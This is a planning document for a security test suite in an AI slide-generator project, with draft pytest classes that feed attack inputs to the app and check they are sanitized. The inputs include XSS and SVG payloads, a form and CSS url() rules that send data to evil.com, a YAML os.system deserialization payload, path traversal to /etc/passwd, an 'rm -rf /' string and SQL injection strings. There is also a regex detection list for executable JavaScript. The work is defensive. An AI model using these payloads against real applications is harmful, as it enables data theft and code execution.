# Security Test Suite Plan

**Date:** 2026-02-01
**Status:** Ready for Implementation
**Estimated Tests:** ~25 tests
**Priority:** Medium

---

## Prerequisites

**Working directory:** `/Users/robert.whiffin/Documents/slide-generator/ai-slide-generator`

**Run tests from:** Project root

```bash
pytest tests/unit/test_security.py -v
```

**Python environment:**
```bash
source .venv/bin/activate
```

---

## Critical: Read These Files First

Before implementing, read these files completely:

1. **HTML parsing:** `src/domain/slide_deck.py`
2. **Slide manipulation:** `src/domain/slide.py`
3. **API routes:** `src/api/routes/` (especially `chat.py`, `slides.py`)
4. **Config loading:** `src/core/config_loader.py`
5. **Existing validation:** `tests/validation/html_validator.py`
6. **Test fixtures:** `tests/conftest.py`

---

## Context: What Security Tests Cover

The app processes user input and LLM-generated content that could contain malicious payloads:

1. **XSS (Cross-Site Scripting)** - Malicious JavaScript in slides
2. **HTML Injection** - Malicious HTML that breaks layout or steals data
3. **CSS Injection** - CSS that exfiltrates data or creates clickjacking
4. **YAML Injection** - Unsafe deserialization in config files
5. **Path Traversal** - Accessing files outside allowed directories
6. **SQL Injection** - (Should be prevented by ORM, but verify)

These tests verify:
- Dangerous content is sanitized or rejected
- User input doesn't break application security
- LLM output is validated before rendering
- Configuration files are safely parsed

---

## Security Scenarios to Test

### Attack Vectors

| Vector | Example | Risk |
|--------|---------|------|
| Script injection | `<script>alert('xss')</script>` | Execute arbitrary JS |
| Event handlers | `<img onerror="evil()">` | Execute JS on error |
| Data URLs | `<a href="data:text/html,<script>">` | Execute JS via link |
| CSS expressions | `background: url(javascript:...)` | Execute JS via CSS |
| SVG scripts | `<svg onload="evil()">` | Execute JS via SVG |
| Form injection | `<form action="evil.com">` | Steal credentials |
| iframe injection | `<iframe src="evil.com">` | Embed malicious content |

---

## Test Categories

### 1. XSS Prevention Tests

```python
class TestXSSPrevention:
    """Tests for Cross-Site Scripting prevention."""

    def test_script_tags_sanitized(self):
        """Script tags are removed or escaped from slide HTML."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <h1>Title</h1>
            <script>alert('XSS')</script>
            <p>Content</p>
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        assert "<script>" not in sanitized
        assert "alert(" not in sanitized

    def test_event_handlers_removed(self):
        """Event handler attributes are removed."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <img src="x" onerror="alert('XSS')">
            <button onclick="evil()">Click</button>
            <div onmouseover="steal()">Hover</div>
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        assert "onerror" not in sanitized
        assert "onclick" not in sanitized
        assert "onmouseover" not in sanitized

    def test_javascript_urls_blocked(self):
        """javascript: URLs are blocked."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <a href="javascript:alert('XSS')">Click me</a>
            <img src="javascript:evil()">
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        assert "javascript:" not in sanitized.lower()

    def test_data_urls_restricted(self):
        """data: URLs with scripts are blocked."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <a href="data:text/html,<script>alert('XSS')</script>">Click</a>
            <iframe src="data:text/html,<script>evil()</script>"></iframe>
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        # data:text/html should be blocked (data:image/png is OK)
        assert "data:text/html" not in sanitized.lower()

    def test_svg_script_elements_removed(self):
        """SVG with embedded scripts are sanitized."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <svg onload="alert('XSS')">
                <script>evil()</script>
                <circle cx="50" cy="50" r="40"/>
            </svg>
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        assert "onload" not in sanitized
        assert "<script>" not in sanitized

    def test_meta_refresh_blocked(self):
        """Meta refresh redirects are blocked."""
        from src.domain.slide_deck import SlideDeck

        malicious_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="refresh" content="0;url=http://evil.com">
        </head>
        <body><div class="slide">Content</div></body>
        </html>
        """

        deck = SlideDeck.from_html(malicious_html)
        output = deck.to_html()

        assert "refresh" not in output.lower()
        assert "evil.com" not in output
```

### 2. HTML Injection Tests

```python
class TestHTMLInjection:
    """Tests for HTML injection prevention."""

    def test_form_elements_sanitized(self):
        """Form elements that could steal data are removed."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <form action="http://evil.com/steal" method="post">
                <input name="password" type="password">
                <button type="submit">Submit</button>
            </form>
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        # Forms with external actions should be blocked
        assert "action=" not in sanitized or "evil.com" not in sanitized

    def test_iframe_sources_validated(self):
        """Iframes only allow safe sources."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <iframe src="http://evil.com/phishing"></iframe>
            <iframe src="//attacker.com/steal"></iframe>
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        # Iframes to external domains should be blocked
        assert "evil.com" not in sanitized
        assert "attacker.com" not in sanitized

    def test_base_tag_blocked(self):
        """Base tag that changes URL resolution is blocked."""
        from src.domain.slide_deck import SlideDeck

        malicious_html = """
        <!DOCTYPE html>
        <html>
        <head><base href="http://evil.com/"></head>
        <body><div class="slide"><a href="/path">Link</a></div></body>
        </html>
        """

        deck = SlideDeck.from_html(malicious_html)
        output = deck.to_html()

        assert "<base" not in output.lower()

    def test_object_embed_blocked(self):
        """Object and embed tags are blocked."""
        from src.domain.slide import Slide

        malicious_html = """
        <div class="slide">
            <object data="malware.swf"></object>
            <embed src="evil.pdf">
        </div>
        """

        slide = Slide(html=malicious_html)
        sanitized = slide.get_safe_html()

        assert "<object" not in sanitized.lower()
        assert "<embed" not in sanitized.lower()
```

### 3. CSS Injection Tests

```python
class TestCSSInjection:
    """Tests for CSS injection prevention."""

    def test_css_expression_blocked(self):
        """CSS expressions (IE) are blocked."""
        from src.domain.slide_deck import SlideDeck

        malicious_css = """
        .slide {
            width: expression(alert('XSS'));
            background: url(javascript:alert('XSS'));
        }
        """

        deck = SlideDeck()
        deck.update_css(malicious_css)
        output_css = deck.get_css()

        assert "expression(" not in output_css.lower()
        assert "javascript:" not in output_css.lower()

    def test_css_import_restricted(self):
        """CSS @import from external URLs is restricted."""
        from src.domain.slide_deck import SlideDeck

        malicious_css = """
        @import url('http://evil.com/steal.css');
        .slide { color: red; }
        """

        deck = SlideDeck()
        deck.update_css(malicious_css)
        output_css = deck.get_css()

        assert "evil.com" not in output_css

    def test_css_url_data_exfiltration(self):
        """CSS url() that could exfiltrate data is blocked."""
        from src.domain.slide_deck import SlideDeck

        malicious_css = """
        input[value^="a"] { background: url('http://evil.com/leak?char=a'); }
        input[value^="b"] { background: url('http://evil.com/leak?char=b'); }
        """

        deck = SlideDeck()
        deck.update_css(malicious_css)
        output_css = deck.get_css()

        # Should not allow external URLs in CSS
        assert "evil.com" not in output_css
```

### 4. Input Validation Tests

```python
class TestInputValidation:
    """Tests for input validation and sanitization."""

    def test_chat_message_length_limit(self, client):
        """Chat messages have maximum length."""
        very_long_message = "A" * 100000  # 100KB

        response = client.post("/api/chat", json={
            "session_id": "test-123",
            "message": very_long_message
        })

        # Should reject or truncate
        assert response.status_code in [400, 413, 422]

    def test_slide_html_length_limit(self, client):
        """Slide HTML has maximum length."""
        huge_html = "<div class='slide'>" + "x" * 10000000 + "</div>"  # 10MB

        response = client.put("/api/slides/0", json={
            "session_id": "test-123",
            "html": huge_html
        })

        assert response.status_code in [400, 413, 422]

    def test_session_id_format_validated(self, client):
        """Session IDs are validated for format."""
        # Try path traversal in session ID
        response = client.get("/api/slides?session_id=../../../etc/passwd")
        assert response.status_code in [400, 404, 422]

        # Try SQL injection in session ID
        response = client.get("/api/slides?session_id='; DROP TABLE sessions;--")
        assert response.status_code in [400, 404, 422]

    def test_profile_name_sanitized(self, client):
        """Profile names are sanitized."""
        response = client.post("/api/settings/profiles", json={
            "name": "<script>alert('xss')</script>",
            "description": "Test"
        })

        if response.status_code == 201:
            profile = response.json()
            assert "<script>" not in profile["name"]
```

### 5. Configuration Security Tests

```python
class TestConfigSecurity:
    """Tests for configuration file security."""

    def test_yaml_safe_load(self, tmp_path):
        """YAML files are loaded safely (no code execution)."""
        from src.core.config_loader import load_config

        # Create malicious YAML
        malicious_yaml = tmp_path / "evil.yaml"
        malicious_yaml.write_text("""
        !!python/object/apply:os.system
        args: ['echo PWNED']
        """)

        # Should raise error, not execute code
        with pytest.raises(Exception):
            load_config(str(malicious_yaml))

    def test_config_path_traversal_blocked(self):
        """Config file paths can't traverse directories."""
        from src.core.config_loader import load_config

        with pytest.raises(Exception):
            load_config("../../../etc/passwd")

        with pytest.raises(Exception):
            load_config("/etc/passwd")

    def test_env_var_injection_prevented(self):
        """Environment variable expansion doesn't allow injection."""
        import os
        from src.core.config_loader import load_config

        # Set malicious env var
        os.environ["MALICIOUS"] = "; rm -rf /"

        # Config using env var should not execute commands
        # This tests that env vars are treated as strings, not commands
        pass  # Implementation depends on how env vars are used
```

### 6. SQL Injection Tests

```python
class TestSQLInjection:
    """Tests for SQL injection prevention (via ORM)."""

    def test_session_name_sql_injection(self, client, test_db):
        """Session names don't allow SQL injection."""
        response = client.post("/api/sessions", json={
            "name": "'; DROP TABLE sessions; --",
            "profile_id": 1
        })

        # Should either reject or safely escape
        if response.status_code == 201:
            # Verify table still exists
            from src.database.models import Session
            assert test_db.query(Session).count() >= 0

    def test_search_query_sql_injection(self, client, test_db):
        """Search queries don't allow SQL injection."""
        response = client.get("/api/sessions?search=' OR '1'='1")

        # Should return empty or error, not all sessions
        if response.status_code == 200:
            # Verify it didn't bypass filtering
            data = response.json()
            assert isinstance(data, list)  # Not an error dump
```

---

## File to Create

**`tests/unit/test_security.py`**

---

## Helper Functions

```python
def contains_executable_js(html: str) -> bool:
    """Check if HTML contains potentially executable JavaScript."""
    dangerous_patterns = [
        r'<script[^>]*>',
        r'on\w+\s*=',
        r'javascript:',
        r'data:text/html',
        r'expression\s*\(',
        r'url\s*\(\s*["\']?javascript:',
    ]
    import re
    for pattern in dangerous_patterns:
        if re.search(pattern, html, re.IGNORECASE):
            return True
    return False


def get_sanitized_html(raw_html: str) -> str:
    """Get sanitized HTML using the app's sanitization logic."""
    from src.domain.slide import Slide
    slide = Slide(html=raw_html)
    return slide.get_safe_html()
```

---

## Verification Checklist

Before marking complete:

- [ ] All tests pass: `pytest tests/unit/test_security.py -v`
- [ ] XSS vectors tested (script, events, javascript:, data:)
- [ ] HTML injection tested (forms, iframes, base, object)
- [ ] CSS injection tested (expression, import, url)
- [ ] Input validation tested (length, format, special chars)
- [ ] Config security tested (YAML, path traversal)
- [ ] SQL injection tested (ORM protection verified)
- [ ] File committed to git

---

## Important Notes

1. **If sanitization doesn't exist:** Some tests may fail if the codebase doesn't currently sanitize HTML. In that case, document the gap and create a separate issue to implement sanitization.

2. **Safe vs Unsafe content:** The app may legitimately need to render some HTML/CSS from LLM output. The tests should verify that *dangerous* content is blocked while *safe* content is allowed.

3. **Defense in depth:** Even if frontend sanitizes, backend should also sanitize. Test both layers if possible.

---

## Debug Commands

```bash
# Run security tests
pytest tests/unit/test_security.py -v

# Run specific test class
pytest tests/unit/test_security.py::TestXSSPrevention -v

# Run single test
pytest tests/unit/test_security.py -k "test_script_tags_sanitized" -v
```
